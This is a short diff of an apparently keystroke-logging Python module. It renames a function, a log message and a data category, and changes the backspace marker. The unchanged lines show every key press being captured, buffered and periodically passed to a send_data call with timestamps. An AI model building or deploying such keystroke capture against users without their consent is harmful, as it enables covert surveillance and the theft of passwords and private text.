@@ -35,11 +35,11 @@ def flush_periodically():
         time.sleep(config.KEYSTROKE_BUFFER_INTERVAL)
         text = flush_buffer()
         if text:
-            log(f"Flushing keystroke buffer...", "DEBUG", "keystrokes")
+            log(f"Flushing keystrokes buffer...", "DEBUG", "keystrokes")
             send_data({
                 "timestamp": get_timestamp(),
                 "text": text
-            }, "keystroke")
+            }, "keystrokes")
 
 
 def on_press(key):
@@ -54,7 +54,7 @@ def on_press(key):
         elif key == keyboard.Key.enter:
             key_str = "\n"
         elif key == keyboard.Key.backspace:
-            key_str = "[BACKSPACE]"
+            key_str = "[BACK]"
         elif key == keyboard.Key.tab:
             key_str = "[TAB]"
         elif key == keyboard.Key.delete:
@@ -117,7 +117,7 @@ def on_press(key):
         log(f"Keystrokes monitoring error: {e}", "ERROR", "keystrokes")
 
 
-def start_keystroke_monitoring():
+def start_keystrokes_monitoring():
     global buffer, last_flush_time
     buffer = []
     last_flush_time = time.time()
@@ -143,4 +143,4 @@ def start_keystroke_monitoring():
                 send_data({
                     "timestamp": get_timestamp(),
                     "text": text
-                }, "keystroke")
+                }, "keystrokes")
